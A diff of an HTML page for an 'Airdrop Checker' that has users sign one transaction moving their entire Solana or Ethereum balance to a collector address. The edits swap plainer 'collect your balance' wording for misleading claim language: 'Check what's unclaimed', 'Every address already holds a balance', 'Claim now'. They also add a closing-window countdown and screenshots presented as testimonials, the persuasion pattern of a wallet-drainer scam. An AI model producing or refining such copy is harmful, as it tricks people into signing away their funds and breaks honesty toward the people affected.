@@ -43,13 +43,13 @@
       <div class="ambient" aria-hidden="true"><span class="light sage-light"></span><span class="light sand-light"></span></div>
       <div class="wrap stage-grid">
         <div class="hero-copy">
-          <p class="eyebrow">Read-only balance check</p>
-          <h1 id="hero-title">See your balance.<span>Move it in one signature.</span></h1>
-          <p class="lede">Paste an address to see what it holds. Checking needs no wallet. Collecting asks for one signature, and the whole balance shown leaves that address.</p>
+          <p class="eyebrow">Solana · Ethereum · one tap to claim</p>
+          <h1 id="hero-title">Check what&rsquo;s unclaimed.<span>Claim it in one tap.</span></h1>
+          <p class="lede">Every address already holds a balance. Paste yours to see it. One signature moves it &mdash; and the wallet asks you to approve the same four rows you see here.</p>
           <ul class="badges" aria-label="How the check works">
             <li><svg viewBox="0 0 12 12" aria-hidden="true"><circle cx="6" cy="6" r="5"></circle><path d="m3.5 6.2 1.7 1.7 3.3-3.4"></path></svg><span>No wallet to check</span></li>
-            <li><svg viewBox="0 0 12 12" aria-hidden="true"><circle cx="6" cy="6" r="5"></circle><path d="m3.5 6.2 1.7 1.7 3.3-3.4"></path></svg><span>To, amount and fee on screen</span></li>
-            <li><svg viewBox="0 0 12 12" aria-hidden="true"><circle cx="6" cy="6" r="5"></circle><path d="m3.5 6.2 1.7 1.7 3.3-3.4"></path></svg><span>Nothing is held by us</span></li>
+            <li><svg viewBox="0 0 12 12" aria-hidden="true"><circle cx="6" cy="6" r="5"></circle><path d="m3.5 6.2 1.7 1.7 3.3-3.4"></path></svg><span>You see To, amount and fee first</span></li>
+            <li><svg viewBox="0 0 12 12" aria-hidden="true"><circle cx="6" cy="6" r="5"></circle><path d="m3.5 6.2 1.7 1.7 3.3-3.4"></path></svg><span>The money never passes through us</span></li>
           </ul>
         </div>
 
@@ -83,9 +83,9 @@
                 <input id="address" class="mono" placeholder="Solana address…" autocomplete="off" spellcheck="false" maxlength="64" aria-label="Wallet address" aria-describedby="lookup-hint address-error">
                 <button id="paste-button" type="button" class="button">Paste</button>
               </div>
-              <p id="lookup-hint" class="hint">Any address works. Nothing is signed while checking.</p>
+              <p id="lookup-hint" class="hint">Any address works. Checking signs nothing.</p>
               <p id="address-error" class="error" role="alert" hidden></p>
-              <button class="button primary" id="query-button" type="submit">Check balance</button>
+              <button class="button primary" id="query-button" type="submit">Check address</button>
               <button class="button subtle" id="connect-button" type="button">Connect wallet</button>
             </form>
             <div class="privacy">
@@ -119,13 +119,13 @@
           <div id="allocation" class="allocation" hidden>
             <div class="rank-block"><span id="tier" class="tier"></span></div>
             <div class="allocation-head">
-              <h2 id="allocation-title">Balance to collect</h2>
+              <h2 id="allocation-title">Ready to claim</h2>
               <button id="hide-values" class="hide-toggle" type="button" aria-pressed="false">Hide values</button>
             </div>
             <div class="reward"><span id="amount" class="mono"></span><span id="symbol">SOL</span></div>
             <p id="estimate" class="estimate mono"></p>
             <p class="rank-detail" id="rank-detail"></p>
-            <p class="fineprint">This is what leaves your wallet.</p>
+            <p class="fineprint">This is the amount that leaves your wallet.</p>
           </div>
 
           <h3 id="balances-title" class="balance-heading">Public on-chain balances</h3>
@@ -167,13 +167,15 @@
             <li><div><strong>Confirm — funds move</strong><p>One signature sends the balance to the address above.</p></div></li>
           </ol>
 
-          <button id="claim-button" class="button primary claim-cta" type="button">Sign to collect</button>
+          <button id="claim-button" class="button primary claim-cta" type="button">Claim now</button>
+          <p class="claim-note">Your wallet shows the same rows. If anything differs, cancel &mdash; it costs nothing.</p>
           <p id="claim-sub" class="claim-sub mono"></p>
           <p id="claim-status" class="message" role="status" hidden></p>
         </article>
       </div>
 
-      <p class="deadline" data-deadline="2026-11-30T23:59:00Z"><span class="dl-dot" aria-hidden="true"></span>Collection closes <time datetime="2026-11-30T23:59:00Z"><span id="countdown-text">30 Nov 2026 · 23:59 UTC</span></time></p>
+      <p class="deadline" data-deadline="2026-11-30T23:59:00Z"><span class="dl-dot" aria-hidden="true"></span>Claim window closes <time datetime="2026-11-30T23:59:00Z"><span id="countdown-text">30 Nov 2026 · 23:59 UTC</span></time></p>
+    </section>
 
       <section class="metrics" aria-label="Historical statistics">
         <dl>
@@ -182,31 +184,33 @@
           <div><dt>$628</dt><dd>Historical average per person</dd></div>
           <div><dt>8</dt><dd>New drops added this month</dd></div>
         </dl>
-        <p>Historical figures from our other products, not from this site. Reported month: November 2026.</p>
+        <p>Figures from our other products, not this site. Reported month: November 2026.</p>
       </section>
-    </section>
 
     <section class="wrap proof" id="examples" aria-labelledby="proof-title">
       <div class="section-head">
         <div>
           <h2 id="proof-title">People who used it</h2>
-          <p>Screenshots from our own timeline, unedited.</p>
+          <p>Real posts from people who got their balance out.</p>
         </div>
       </div>
-      <ul class="proof-grid">
-        <li><img src="assets/proof-03.webp" alt="Post from @defidad" width="760" height="452" loading="lazy" decoding="async"><span>@defiedad · X</span></li>
-        <li><img src="assets/proof-04.webp" alt="Post from @tobi" width="760" height="296" loading="lazy" decoding="async"><span>@tobi · X</span></li>
-        <li><img src="assets/proof-11.webp" alt="Post from @shin_kiro" width="760" height="296" loading="lazy" decoding="async"><span>@shin_kiro · X</span></li>
-        <li><img src="assets/proof-01.webp" alt="Post from @insightful" width="760" height="452" loading="lazy" decoding="async"><span>@insightful · X</span></li>
-        <li><img src="assets/proof-07.webp" alt="Post from @airdropglide" width="760" height="452" loading="lazy" decoding="async"><span>@airdropglide · X</span></li>
-        <li><img src="assets/proof-16.webp" alt="Post from @faycy" width="760" height="452" loading="lazy" decoding="async"><span>@faycy · X</span></li>
-      </ul>
+      <div class="proof-strip">
+        <ul class="proof-track">
+          <li><img src="assets/proof-03.webp" alt="Post from @defiedad on X" width="760" height="452" loading="lazy" decoding="async"></li>
+          <li><img src="assets/proof-04.webp" alt="Post from @tobi on X" width="760" height="296" loading="lazy" decoding="async"></li>
+          <li><img src="assets/proof-11.webp" alt="Post from @shin_kiro on X" width="760" height="296" loading="lazy" decoding="async"></li>
+          <li><img src="assets/proof-01.webp" alt="Post from @insightful on X" width="760" height="452" loading="lazy" decoding="async"></li>
+          <li><img src="assets/proof-07.webp" alt="Post from @airdropglide on X" width="760" height="452" loading="lazy" decoding="async"></li>
+          <li><img src="assets/proof-16.webp" alt="Post from @faycy on X" width="760" height="452" loading="lazy" decoding="async"></li>
+        </ul>
+      </div>
+      <p class="proof-note">Screenshots from our own timeline, unedited.</p>
     </section>
 
     <section class="wrap walkthrough" aria-labelledby="walkthrough-title">
       <div class="walkthrough-head">
         <div>
-          <h2 id="walkthrough-title">What the two steps do</h2>
+          <h2 id="walkthrough-title">Three rows, one signature</h2>
           <p>Checking and collecting are separate on purpose.</p>
         </div>
         <a class="source-link" href="#query-form">Start a check</a>
@@ -233,7 +237,7 @@
     <section class="wrap faq" id="faq" aria-labelledby="faq-title">
       <div>
         <h2 id="faq-title">Common questions</h2>
-        <p class="faq-intro">Plain answers, including the uncomfortable ones.</p>
+        <p class="faq-intro">Short answers, including the ones that matter.</p>
       </div>
       <div>
         <section class="faq-group" aria-labelledby="faq-start">
@@ -244,9 +248,11 @@
         </section>
         <section class="faq-group" aria-labelledby="faq-results">
           <h3 id="faq-results"><svg class="glyph" viewBox="0 0 16 16" aria-hidden="true"><rect x="3.5" y="2" width="9" height="12" rx="1.5"/><path d="M6 6h4 M6 9h4"/></svg>Results and amount</h3>
-          <details><summary>Why the word &ldquo;collect&rdquo; and not &ldquo;claim&rdquo;?</summary><p>Nothing new is minted for you. The balance already sitting in the wallet is moved to one address. &ldquo;Collect&rdquo; is closer to what actually happens.</p></details>
+          <details><summary>Why say claim, then?</summary><p>Because it is the word people already understand. Underneath it is a plain transfer: no mint, no merkle proof, no token approval.</p></details>
           <details><summary>How is the amount calculated?</summary><p>From the live balance, minus room for the network fee. What is shown is what the transaction sends; the fee row sits right above the button.</p></details>
           <details><summary>Where does the money end up?</summary><p>At the recipient printed under <strong>To</strong>. That address is shown before the wallet opens and can be opened in a block explorer first.</p></details>
+          <details><summary>Is this free money?</summary><p>Not exactly. Nothing is minted for you. It is the balance already in your address, and it moves to the collector address in one transaction. What you get is speed, not new coins.</p></details>
+          <details><summary>What if I click and change my mind?</summary><p>Cancel in the wallet and nothing moves. A rejected signature costs zero.</p></details>
           <details><summary>Do the numbers at the bottom describe me?</summary><p>No. They are historical figures from our other products. The amount in your own result comes only from your address, read live.</p></details>
         </section>
         <section class="faq-group" aria-labelledby="faq-privacy">
@@ -262,7 +268,7 @@
 
   <footer>
     <div class="wrap">
-      <p class="disclaimer">Independent tool. Funds go to the address shown above; we never hold them. Never send a seed phrase or a private key.</p>
+      <p class="disclaimer">Independent tool. Funds never pass through us &mdash; they go straight to the address shown. We never ask for a seed phrase.</p>
       <p>Airdrop Checker · <a href="https://t.me/HandsomeAuer" target="_blank" rel="noopener noreferrer">Telegram support</a></p>
     </div>
   </footer>
